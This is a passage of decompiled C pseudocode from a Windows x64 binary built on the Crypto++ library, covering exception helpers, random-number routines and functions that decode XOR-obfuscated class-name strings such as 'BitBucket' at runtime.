  *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
  *(_QWORD *)(a1 + 16) = *(_QWORD *)(a2 + 16);
  *(_QWORD *)(a1 + 32) = *(_QWORD *)(a2 + 32);
  v4 = *(_QWORD *)(a2 + 32);
  sub_1400255A0(*(_QWORD *)(a2 + 32));
  if ( v4 )
    v5 = sub_14003A000(v4);
  else
    v5 = 0i64;
  *(_QWORD *)(v2 + 40) = v5;
  v6 = *(const void **)(v3 + 40);
  if ( v6 )
    memcpy_s(v5, *(_QWORD *)(v2 + 32), v6, *(_QWORD *)(v3 + 32));
  return v2;
}

//----- (0000000140037130) ----------------------------------------------------
_DWORD *__fastcall sub_140037130(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 0;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140037210) ----------------------------------------------------
__int64 __fastcall sub_140037210(__int64 a1)
{
  void *v1; // rdi
  unsigned __int64 v2; // rdx
  __int64 result; // rax

  v1 = *(void **)(a1 + 272);
  v2 = *(_QWORD *)(a1 + 264);
  if ( v1 == (void *)a1 )
  {
    *(_BYTE *)(a1 + 257) = 0;
    result = 0i64;
    memset(v1, 0, v2);
  }
  return result;
}

//----- (0000000140037260) ----------------------------------------------------
void __fastcall sub_140037260(__int64 a1)
{
  void *v1; // rdx

  v1 = *(void **)(a1 + 40);
  memset(v1, 0, *(_QWORD *)(a1 + 32));
  free(v1);
}

//----- (0000000140037290) ----------------------------------------------------
__int64 __fastcall sub_140037290(__int64 a1, __int64 a2)
{
  signed __int64 v2; // rdi
  signed __int64 v3; // rsi
  __int64 v4; // rbx
  void *v5; // rcx
  const void *v6; // r8
  rsize_t v7; // r9

  v2 = a2 + 24;
  v3 = a1 + 24;
  *(_BYTE *)a1 = *(_BYTE *)a2;
  v4 = a1;
  *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
  *(_QWORD *)(a1 + 16) = *(_QWORD *)(a2 + 16);
  if ( a1 + 24 != a2 + 24 )
  {
    sub_140038C40(a1 + 24, *(_QWORD *)(a2 + 32));
    v5 = *(void **)(v3 + 16);
    if ( v5 )
    {
      v6 = *(const void **)(v2 + 16);
      if ( v6 )
      {
        v7 = *(_QWORD *)(v2 + 8);
        if ( v7 )
          memcpy_s(v5, *(_QWORD *)(v3 + 8), v6, v7);
      }
    }
  }
  return v4;
}

//----- (0000000140037308) ----------------------------------------------------
void *__fastcall sub_140037308(__int64 a1, char a2)
{
  return sub_140089010((void *)(a1 - 8), a2);
}

//----- (0000000140037320) ----------------------------------------------------
_QWORD *__fastcall sub_140037320(void *a1, char a2)
{
  char v2; // bl
  _QWORD *v3; // rsi
  void *v4; // r8

  v2 = a2;
  v3 = a1;
  v4 = (void *)*((_QWORD *)a1 + 9);
  memset(*((void **)a1 + 9), 0, *((_QWORD *)a1 + 8));
  free(v4);
  sub_140024220(v3);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140037390) ----------------------------------------------------
unsigned __int64 __fastcall sub_140037390(__int64 a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4, unsigned __int64 a5, char a6)
{
  unsigned __int64 v6; // rbx
  unsigned __int64 v7; // r14
  unsigned __int64 v8; // rdi
  __int64 v9; // r15
  unsigned int v10; // eax
  unsigned __int64 v11; // rbp
  unsigned __int64 v12; // rsi
  __int64 v13; // r13
  __int64 v14; // rcx
  __int64 v15; // rdx
  int v16; // eax
  int v17; // er12
  unsigned __int64 v18; // r8
  unsigned __int64 v19; // rdx
  __int64 v21; // [rsp+60h] [rbp+8h]
  __int64 v22; // [rsp+70h] [rbp+18h]
  int v23; // [rsp+88h] [rbp+30h]

  v6 = a4;
  v7 = a3;
  v8 = a2;
  v9 = a1;
  v10 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 32i64))();
  v11 = a5;
  v12 = v10;
  v13 = v10;
  if ( a6 & 3 )
    v13 = 0i64;
  v14 = 0i64;
  if ( v7 )
    v14 = v10;
  v15 = v10;
  if ( a6 & 2 )
    v15 = 0i64;
  v22 = v14;
  v21 = v15;
  if ( a6 & 8 )
  {
    v13 = -v13;
    v22 = -v14;
    v8 += a5 - v10;
    v7 += a5 - v10;
    v6 += a5 - v10;
    v21 = -v15;
  }
  if ( a5 >= v10 )
  {
    v16 = a6 & 4;
    v17 = a6 & 1;
    v23 = a6 & 4;
    do
    {
      if ( v16 )
      {
        sub_14003A1E0(v6, v7, v8, v12);
        v18 = 0i64;
        v19 = v6;
      }
      else
      {
        v18 = v7;
        v19 = v8;
      }
      (*(void (__fastcall **)(__int64, unsigned __int64, unsigned __int64, unsigned __int64))(*(_QWORD *)v9 + 24i64))(
        v9,
        v19,
        v18,
        v6);
      if ( v17 )
        ++*(_BYTE *)(v12 + v8 - 1);
      v6 += v21;
      v7 += v22;
      v16 = v23;
      v11 -= v12;
      v8 += v13;
    }
    while ( v11 >= v12 );
  }
  return v11;
}

//----- (00000001400374B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400374B0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  a2[3] = 15i64;
  v2 = a2;
  a2[2] = 0i64;
  *(_BYTE *)a2 = 0;
  sub_140004F20(a2, "NullRNG", 7ui64);
  return v2;
}

//----- (00000001400374F0) ----------------------------------------------------
void *__fastcall sub_1400374F0(__int64 a1, void *a2)
{
  void *v2; // rbx

  v2 = a2;
  sub_1400380E0(a2);
  return v2;
}

//----- (0000000140037520) ----------------------------------------------------
char __fastcall sub_140037520(__int64 *a1)
{
  __int64 *v1; // rbx
  bool v2; // zf
  __int64 v3; // rax
  __int64 v4; // rax

  v1 = a1;
  v2 = (*(__int64 (**)(void))(*a1 + 320))() == 0;
  v3 = *v1;
  if ( v2 )
    return (*(unsigned int (__fastcall **)(__int64 *))(v3 + 184))(v1) != 0;
  v4 = (*(__int64 (__fastcall **)(__int64 *))(v3 + 320))(v1);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 192i64))(v4);
}

//----- (0000000140037570) ----------------------------------------------------
char __fastcall sub_140037570(__int64 *a1)
{
  __int64 *v1; // rbx
  bool v2; // zf
  __int64 v3; // rax
  __int64 v4; // rax
  char v6; // [rsp+30h] [rbp+8h]

  v1 = a1;
  v2 = (*(__int64 (**)(void))(*a1 + 320))() == 0;
  v3 = *v1;
  if ( v2 )
    return (*(__int64 (__fastcall **)(__int64 *, char *))(v3 + 160))(v1, &v6) != 0;
  v4 = (*(__int64 (__fastcall **)(__int64 *))(v3 + 320))(v1);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 128i64))(v4);
}

//----- (00000001400375C0) ----------------------------------------------------
__int64 __fastcall sub_1400375C0(__int64 a1, void *a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  void *v6; // rbp
  __int64 v7; // rsi
  __int64 result; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !qword_1400DAB40
    || !(unsigned __int8)type_info::operator==(&CryptoPP::cls_053 `RTTI Type Descriptor', &int `RTTI Type Descriptor')
    || (result = qword_1400DAB40(v5, v4, v7 + 32), !(_BYTE)result) )
  {
    sub_1400293A0(v6, (__int64)&CryptoPP::cls_053 `RTTI Type Descriptor', v5);
    result = sub_140037290(v4, v7 + 32);
  }
  return result;
}
// 1400A1928: using guessed type __int64 __fastcall type_info::operator==(_QWORD, _QWORD);
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (0000000140037650) ----------------------------------------------------
__int64 __fastcall sub_140037650(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  __int64 v4; // rax
  __int64 v5; // rax

  v2 = a2;
  v3 = a1;
  if ( !(*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))() )
    return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v3 + 336i64))(v3, v2);
  v4 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 328i64))(v3);
  if ( !(*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v4 + 312i64))(v4) )
    return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v3 + 336i64))(v3, v2);
  v5 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 328i64))(v3);
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v5 + 344i64))(v5, v2);
}

//----- (00000001400376D0) ----------------------------------------------------
__int64 __fastcall sub_1400376D0(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))();
}

//----- (00000001400376E0) ----------------------------------------------------
__int64 __fastcall sub_1400376E0(__int64 *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax
  char v5; // [rsp+28h] [rbp-80h]
  char v6; // [rsp+50h] [rbp-58h]

  v3 = *a1;
  if ( *(_QWORD *)(a2 + 16) )
  {
    (*(void (__fastcall **)(__int64 *, char *))(v3 + 16))(a1, &v5);
    sub_140037130(&v6);
    CxxThrowException(&v6, &_TI4_AUcls_080_cls_023_CryptoPP__);
  }
  return (*(__int64 (__fastcall **)(__int64 *, __int64))(v3 + 24))(a1, a3);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3FD0: using guessed type int _TI4_AUcls_080_cls_023_CryptoPP__;

//----- (0000000140037880) ----------------------------------------------------
__int64 __fastcall sub_140037880(__int64 *a1, __int64 a2, unsigned __int8 a3, unsigned int a4, unsigned __int8 a5)
{
  __int64 v5; // rax
  char v7; // [rsp+28h] [rbp-80h]
  char v8; // [rsp+50h] [rbp-58h]

  v5 = *a1;
  if ( *(_QWORD *)(a2 + 16) )
  {
    (*(void (__fastcall **)(__int64 *, char *))(v5 + 16))(a1, &v7);
    sub_140037130(&v8);
    CxxThrowException(&v8, &_TI4_AUcls_080_cls_023_CryptoPP__);
  }
  return (*(__int64 (__fastcall **)(__int64 *, _QWORD, _QWORD, _QWORD, signed __int64))(v5 + 88))(a1, a3, a4, a5, -2i64);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3FD0: using guessed type int _TI4_AUcls_080_cls_023_CryptoPP__;

//----- (0000000140037910) ----------------------------------------------------
__int64 __fastcall sub_140037910(__int64 *a1, __int64 a2, __int64 a3, unsigned __int8 a4)
{
  __int64 v4; // rax
  char v6; // [rsp+28h] [rbp-80h]
  char v7; // [rsp+50h] [rbp-58h]

  v4 = *a1;
  if ( *(_QWORD *)(a2 + 16) )
  {
    (*(void (__fastcall **)(__int64 *, char *, __int64, _QWORD, signed __int64))(v4 + 16))(
      a1,
      &v6,
      a3,
      (unsigned int)a3,
      -2i64);
    sub_140037130(&v7);
    CxxThrowException(&v7, &_TI4_AUcls_080_cls_023_CryptoPP__);
  }
  return (*(__int64 (__fastcall **)(__int64 *, _QWORD, _QWORD))(v4 + 96))(a1, (unsigned int)a3, a4);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3FD0: using guessed type int _TI4_AUcls_080_cls_023_CryptoPP__;

//----- (0000000140037990) ----------------------------------------------------
__int64 __fastcall sub_140037990(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5, char a6)
{
  char v6; // ST20_1
  char v8; // [rsp+38h] [rbp-80h]
  char v9; // [rsp+60h] [rbp-58h]

  if ( *(_QWORD *)(a2 + 16) )
  {
    (*(void (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 16i64))(a1, &v8);
    sub_140037130(&v9);
    CxxThrowException(&v9, &_TI4_AUcls_080_cls_023_CryptoPP__);
  }
  v6 = a6;
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, char))(*(_QWORD *)a1 + 40i64))(
           a1,
           a3,
           a4,
           a5,
           v6);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3FD0: using guessed type int _TI4_AUcls_080_cls_023_CryptoPP__;

//----- (0000000140037A30) ----------------------------------------------------
__int64 __fastcall sub_140037A30(__int64 *a1, __int64 a2, __int64 a3, __int64 a4, unsigned int a5)
{
  __int64 v5; // r10
  __int64 result; // rax

  v5 = *a1;
  if ( *(_QWORD *)(a2 + 16) )
    result = (*(__int64 (**)(void))(v5 + 272))();
  else
    result = (*(__int64 (__fastcall **)(__int64 *, __int64, __int64, _QWORD))(v5 + 48))(a1, a3, a4, a5);
  return result;
}

//----- (0000000140037A80) ----------------------------------------------------
__int64 __fastcall sub_140037A80(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  if ( (*(__int64 (**)(void))(*(_QWORD *)a1 + 320i64))() )
  {
    do
      v1 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 320i64))(v1);
    while ( (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 320i64))(v1) );
  }
  return 0i64;
}

//----- (0000000140037AD0) ----------------------------------------------------
void __noreturn sub_140037AD0()
{
  char v0; // [rsp+28h] [rbp-80h]
  __int64 v1; // [rsp+38h] [rbp-70h]
  __int64 v2; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v3)(void *); // [rsp+50h] [rbp-58h]
  int v4; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v6; // [rsp+80h] [rbp-28h]
  __int64 v7; // [rsp+88h] [rbp-20h]

  v2 = 15i64;
  v1 = 0i64;
  v0 = 0;
  sub_140004F20(&v0, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)&v3);
  v3 = &off_1400A8798;
  v4 = 0;
  v7 = 15i64;
  v6 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, &v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v3 = &off_1400A8798;
  CxxThrowException(&v3, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140037B90) ----------------------------------------------------
__int64 __fastcall sub_140037B90(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx

  v2 = a2;
  v3 = a1;
  if ( !(dword_1400DA840 & 1) )
  {
    dword_1400DA840 |= 1u;
    qword_1400DA828 = (__int64)&off_1400A87C8;
    qword_1400DA830 = (__int64)off_1400A9A98;
    atexit(sub_1400A0060);
  }
  return (*(__int64 (__fastcall **)(__int64, __int64 *, void **, __int64, signed __int64))(*(_QWORD *)v3 + 72i64))(
           v3,
           &qword_1400DA828,
           &qword_1400D8080,
           v2,
           -2i64);
}
// 1400A87C8: using guessed type __int64 (__fastcall *off_1400A87C8)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();
// 1400DA828: using guessed type __int64 qword_1400DA828;
// 1400DA830: using guessed type __int64 qword_1400DA830;
// 1400DA840: using guessed type int dword_1400DA840;

//----- (0000000140037C10) ----------------------------------------------------
__int64 __fastcall sub_140037C10(__int64 a1, unsigned __int8 a2, unsigned int a3, char a4)
{
  char v4; // ST20_1

  v4 = a4;
  return (*(__int64 (__fastcall **)(__int64, void **, _QWORD, _QWORD, char))(*(_QWORD *)a1 + 288i64))(
           a1,
           &qword_1400D8080,
           a2,
           a3,
           v4);
}

//----- (0000000140037C40) ----------------------------------------------------
__int64 __fastcall sub_140037C40(__int64 a1, __int64 a2, __int64 a3, unsigned __int8 a4)
{
  return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 64i64))(a1, a2, a4);
}

//----- (0000000140037C50) ----------------------------------------------------
__int64 __fastcall sub_140037C50(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 40i64))() & 1;
}

//----- (0000000140037C70) ----------------------------------------------------
void __noreturn sub_140037C70()
{
  char v0; // [rsp+28h] [rbp-80h]
  __int64 v1; // [rsp+38h] [rbp-70h]
  __int64 v2; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v3)(void *); // [rsp+50h] [rbp-58h]
  int v4; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v6; // [rsp+80h] [rbp-28h]
  __int64 v7; // [rsp+88h] [rbp-20h]

  v2 = 15i64;
  v1 = 0i64;
  v0 = 0;
  sub_140004F20(&v0, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)&v3);
  v3 = &off_1400A8798;
  v4 = 0;
  v7 = 15i64;
  v6 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, &v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v3 = &off_1400A8798;
  CxxThrowException(&v3, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140037D30) ----------------------------------------------------
__int64 __fastcall sub_140037D30(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 (__fastcall **v4)(); // [rsp+28h] [rbp-40h]
  __int64 (__fastcall **v5)(); // [rsp+30h] [rbp-38h]
  __int64 v6; // [rsp+40h] [rbp-28h]
  __int64 v7; // [rsp+48h] [rbp-20h]
  __int64 v8; // [rsp+50h] [rbp-18h]

  v4 = &off_1400A8940;
  v5 = off_1400A9A98;
  v6 = a2;
  v7 = a3;
  v8 = 0i64;
  return (*(__int64 (__fastcall **)(__int64, __int64 (__fastcall ***)(), void **, __int64, signed __int64, __int64 (__fastcall **)(), __int64 (__fastcall **)()))(*(_QWORD *)a1 + 72i64))(
           a1,
           &v4,
           &qword_1400D8080,
           a3,
           -2i64,
           &off_1400A8940,
           off_1400A9A98);
}
// 1400A8940: using guessed type __int64 (__fastcall *off_1400A8940)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();

//----- (0000000140037DA0) ----------------------------------------------------
__int64 __fastcall sub_140037DA0(__int64 a1)
{
  unsigned __int8 v2; // [rsp+30h] [rbp+8h]

  (*(void (__fastcall **)(__int64, unsigned __int8 *, signed __int64))(*(_QWORD *)a1 + 64i64))(a1, &v2, 1i64);
  return v2;
}

//----- (0000000140037DC0) ----------------------------------------------------
char *__fastcall sub_140037DC0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rsi
  __int64 v5; // rbp
  __int64 v6; // r15
  __int64 v7; // r14
  unsigned __int64 v8; // rbx
  char *v9; // rdi
  char *result; // rax
  __int64 v11; // [rsp+20h] [rbp-178h]
  __int64 v12; // [rsp+28h] [rbp-170h]
  signed __int64 v13; // [rsp+30h] [rbp-168h]
  char v14; // [rsp+38h] [rbp-160h]
  char v15; // [rsp+139h] [rbp-5Fh]
  unsigned __int64 v16; // [rsp+140h] [rbp-58h]
  char *i; // [rsp+148h] [rbp-50h]

  v13 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = 256i64;
  v16 = 256i64;
  v15 = 1;
  v9 = &v14;
  for ( i = &v14; v4; v8 = v16 )
  {
    if ( v4 < v8 )
      v8 = v4;
    (*(void (__fastcall **)(__int64, char *, unsigned __int64))(*(_QWORD *)v7 + 64i64))(v7, v9, v8);
    LOBYTE(v12) = 1;
    LODWORD(v11) = 0;
    (*(void (__fastcall **)(__int64, __int64, char *, unsigned __int64, __int64, __int64, signed __int64))(*(_QWORD *)v6 + 272i64))(
      v6,
      v5,
      i,
      v8,
      v11,
      v12,
      v13);
    v9 = i;
    v4 -= v8;
  }
  result = &v14;
  if ( v9 == &v14 )
  {
    result = 0i64;
    memset(v9, 0, v8);
  }
  return result;
}

//----- (0000000140037EB0) ----------------------------------------------------
__int64 __fastcall sub_140037EB0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // r14

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  (*(void (**)(void))(*(_QWORD *)a1 + 80i64))();
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v7 + 88i64))(v7, v6, v5, v4);
}

//----- (0000000140037F00) ----------------------------------------------------
__int64 __fastcall sub_140037F00(__int64 a1, int a2, int a3)
{
  signed int v3; // er9
  int v4; // ebp
  __int64 v5; // rsi
  unsigned int v6; // ebx
  unsigned int v7; // edx
  unsigned __int64 v8; // rdi
  unsigned int v9; // eax
  unsigned int v11; // [rsp+38h] [rbp+10h]

  v3 = 0;
  v4 = a2;
  v5 = a1;
  v6 = a3 - a2;
  if ( a3 != a2 )
  {
    v7 = 0;
    v3 = 32;
    do
    {
      if ( v6 >> ((v3 + v7) >> 1) )
        v7 = (v3 + v7) >> 1;
      else
        v3 = (v3 + v7) >> 1;
    }
    while ( v3 - v7 > 1 );
  }
  v8 = v3;
  do
  {
    (*(void (__fastcall **)(__int64, unsigned int *, signed __int64))(*(_QWORD *)v5 + 64i64))(v5, &v11, 4i64);
    if ( v8 >= 0x20 )
      v9 = v11;
    else
      v9 = v11 & ((1 << v8) - 1);
    v11 = v9;
  }
  while ( v9 > v6 );
  return v4 + v9;
}

//----- (0000000140037FB0) ----------------------------------------------------
__int64 __fastcall sub_140037FB0(__int64 *a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 *v3; // rbx
  bool v4; // zf
  __int64 v5; // rax
  __int64 v6; // rax

  v2 = a2;
  v3 = a1;
  v4 = (*(__int64 (**)(void))(*a1 + 328))() == 0;
  v5 = *v3;
  if ( v4 )
    return (*(__int64 (__fastcall **)(__int64 *, __int64, signed __int64))(v5 + 136))(v3, v2, 1i64);
  v6 = (*(__int64 (__fastcall **)(__int64 *))(v5 + 328))(v3);
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v6 + 144i64))(v6, v2);
}

//----- (0000000140038010) ----------------------------------------------------
__int64 __fastcall sub_140038010(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rsi
  __int64 v5; // rbx
  __int64 v6; // rax
  __int64 result; // rax
  char v8; // ST20_1
  __int64 v9; // [rsp+30h] [rbp-68h]
  __int64 v10; // [rsp+38h] [rbp-60h]
  __int64 (__fastcall **v11)(); // [rsp+40h] [rbp-58h]
  __int64 (__fastcall **v12)(); // [rsp+48h] [rbp-50h]
  __int64 v13; // [rsp+58h] [rbp-40h]
  __int64 v14; // [rsp+60h] [rbp-38h]
  __int64 v15; // [rsp+68h] [rbp-30h]

  v10 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  if ( (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))() )
  {
    v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 328i64))(v5);
    result = (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v6 + 136i64))(v6, v4, v3);
  }
  else
  {
    v11 = &off_1400A8940;
    v12 = off_1400A9A98;
    v13 = v4;
    v14 = v3;
    v15 = 0i64;
    v9 = v3;
    v8 = 1;
    (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(), __int64 *, void **, char))(*(_QWORD *)v5 + 248i64))(
      v5,
      &v11,
      &v9,
      &qword_1400D8080,
      v8);
    result = v9;
  }
  return result;
}
// 1400A8940: using guessed type __int64 (__fastcall *off_1400A8940)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();

//----- (00000001400380E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400380E0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA7C8;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA7C8 & 1 )
  {
    v5 = byte_1400DA7C4;
  }
  else
  {
    v4 = 69069 * dword_1400DA7BC + 1234567;
    v1 = dword_1400DA7C8 | 1;
    dword_1400DA7BC = v4;
    dword_1400DA7C8 |= 1u;
    dword_1400DA7A4 = HIWORD(dword_1400DA7A4) + 36969 * (unsigned __int16)dword_1400DA7A4;
    LOBYTE(v4) = (BYTE2(dword_1400DA7C0) + 80 * dword_1400DA7C0) ^ v4;
    dword_1400DA7C0 = HIWORD(dword_1400DA7C0) + 18000 * (unsigned __int16)dword_1400DA7C0;
    v5 = (((unsigned int)dword_1400DA7B8 >> 13) ^ 32 * dword_1400DA7B8 ^ dword_1400DA7B8) + v4;
    dword_1400DA7B8 ^= ((unsigned int)dword_1400DA7B8 >> 13) ^ 32 * (dword_1400DA7B8 ^ (dword_1400DA7B8 << 12));
    byte_1400DA7C4 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA7C8 = v1 | 2;
    byte_1400DA7D0[0] = v5 ^ 0x42;
    byte_1400DA7D1 = (v5 - 1) ^ 0x69;
    byte_1400DA7D2 = (v5 - 2) ^ 0x74;
    byte_1400DA7D3 = (v5 - 3) ^ 0x42;
    byte_1400DA7D4 = (v5 - 4) ^ 0x75;
    byte_1400DA7D5 = (v5 - 5) ^ 0x63;
    byte_1400DA7D6 = (v5 - 6) ^ 0x6B;
    byte_1400DA7D7 = (v5 - 7) ^ 0x65;
    byte_1400DA7D8 = (v5 - 8) ^ 0x74;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 9ui64 )
  {
    sub_140004790(Src, 9ui64, 0i64);
    v5 = byte_1400DA7C4;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_BYTE *)v6 + 8) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 9i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 9) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA7D0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 9 );
  return v3;
}
// 1400DA7A4: using guessed type int dword_1400DA7A4;
// 1400DA7B8: using guessed type int dword_1400DA7B8;
// 1400DA7BC: using guessed type int dword_1400DA7BC;
// 1400DA7C0: using guessed type int dword_1400DA7C0;
// 1400DA7C4: using guessed type char byte_1400DA7C4;
// 1400DA7C8: using guessed type int dword_1400DA7C8;
// 1400DA7D1: using guessed type char byte_1400DA7D1;
// 1400DA7D2: using guessed type char byte_1400DA7D2;
// 1400DA7D3: using guessed type char byte_1400DA7D3;
// 1400DA7D4: using guessed type char byte_1400DA7D4;
// 1400DA7D5: using guessed type char byte_1400DA7D5;
// 1400DA7D6: using guessed type char byte_1400DA7D6;
// 1400DA7D7: using guessed type char byte_1400DA7D7;
// 1400DA7D8: using guessed type char byte_1400DA7D8;

//----- (00000001400382C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400382C0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA7DC;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA7DC & 1 )
  {
    v5 = byte_1400DA7D9;
  }
  else
  {
    v4 = 69069 * dword_1400DA7BC + 1234567;
    v1 = dword_1400DA7DC | 1;
    dword_1400DA7BC = v4;
    dword_1400DA7DC |= 1u;
    dword_1400DA7A4 = HIWORD(dword_1400DA7A4) + 36969 * (unsigned __int16)dword_1400DA7A4;
    LOBYTE(v4) = (BYTE2(dword_1400DA7C0) + 80 * dword_1400DA7C0) ^ v4;
    dword_1400DA7C0 = HIWORD(dword_1400DA7C0) + 18000 * (unsigned __int16)dword_1400DA7C0;
